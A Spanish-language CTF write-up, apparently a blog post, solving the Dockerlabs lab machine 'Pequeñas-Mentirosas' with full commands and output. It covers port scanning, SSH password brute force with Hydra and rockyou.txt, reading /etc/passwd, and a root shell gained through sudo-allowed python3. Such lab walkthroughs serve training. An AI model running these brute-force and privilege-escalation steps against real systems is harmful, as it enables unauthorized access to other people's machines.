---
layout: post
title: Pequeñas-Mentirosas
subtitle: Plataforma Dockerlabs Dificultad Fácil
cover-img: /assets/img/Pequeñasmentirosas.png
thumbnail-img: /assets/img/Pequeñasmentirosas.png
share-img: /assets/img/Pequeñasmentirosas.png
author: Elmili72
---
![Pequeñasmentirosas](https://github.com/user-attachments/assets/636ddab7-d953-489d-a335-bb77dc13674b)

## 1. Escaneo general de puertos

Para empezar como siempre realizaremos un escaneo de todos los puertos para ver los que están abiertos.

```bash
sudo nmap -sS -p- --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

## 2. Escaneo específico de puertos

Una vez tenemos los puertos abiertos realizamos un escaneo de estos puertos y ver que servicios y en que version corren en ellos. En este caso están corriendo los puertos 22(SSH) y 80(HTTP).

```bash
nmap -sCV -p22,80 172.17.0.2 -oN target
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 9e:10:58:a5:1a:42:9d:be:e5:19:d1:2e:79:9c:ce:21 (ECDSA)
|_  256 6b:a3:a8:84:e0:33:57:fc:44:49:69:41:7d:d3:c9:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

## 3. Reconocimiento de servicio web

A la hora de realizar el reconocimiento del servicio web o IIS (Information Internet Service), vemos solo un texto sin más información que nos da una pista.

![Pasted image 20250518133639](https://github.com/user-attachments/assets/63f76b7d-886a-4da4-a8f4-febb934e32ff)

Realizando un escaneo de subdirectorios y Fuzzing de la página no nos aparece información útil. Por lo que tendremos que suponer que *A* es un usuario del servicio *SSH*.

## 4. Intrusión

Comprobamos nuestras sospechas realizando fuerza bruta con *HYDRA* y logramos la contraseña para conseguir nuestra intrusión por *SSH* y extraer más información y ver si podemos seguir con la escalada de privilegios (no es el caso).

```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-18 13:38:22
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: a   password: secret
```

![Pasted image 20250518133947](https://github.com/user-attachments/assets/518a0587-d37f-4e79-a44f-43a3e2ea8e38)

Lo primero que he hecho al no ver archivos interesantes de primeras y ver que no nos permite realizar las escalda desde este usuario ha sido comprobar si hay más usuarios. Leemos el archivo /etc/passwd y vemos que hay otro usuario más.

```bash
a@347c2e8e7be8:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
spencer:x:1000:1000::/home/spencer:/bin/bash
a:x:1001:1001::/home/a:/bin/bash
```

Vemos el usuario *spencer*, para el cual, después de haber comprobado que no se puede hacer pivoting de otra manera volveremos a utilizar *HYDRA* para conseguir la contraseña por *SSH*.

```bash
hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-18 13:42:17
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: spencer   password: password1
1 of 1 target successfully completed, 1 valid password found
```

![Pasted image 20250518134335](https://github.com/user-attachments/assets/43ffeb19-f0ca-4995-a7e4-e43a9f08bb77)

## 5. Escalada de privilegios

Ahora si que si, nuestro momento favorito :D. Comprobamos si hay podemos realizr la escalada explotando algún binario y efectivamente tenemos */usr/bin/python3*.

```bash
spencer@347c2e8e7be8:~$ sudo -l
Matching Defaults entries for spencer on 347c2e8e7be8:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User spencer may run the following commands on 347c2e8e7be8:
    (ALL) NOPASSWD: /usr/bin/python3
```

En estos casos como siempre vamos a nuestro mejor amigo *GTFOBins* (si no sabes el script de python) y nos generamos una bash como root explotando ese binario.

```bash
spencer@347c2e8e7be8:~$ sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
root@347c2e8e7be8:/home/spencer# whoami
root
root@347c2e8e7be8:/home/spencer# id
uid=0(root) gid=0(root) groups=0(root)
```

¡Espero que os haya gustado y os haya servido de ayuda! ¡Hasta el próximo writeup!
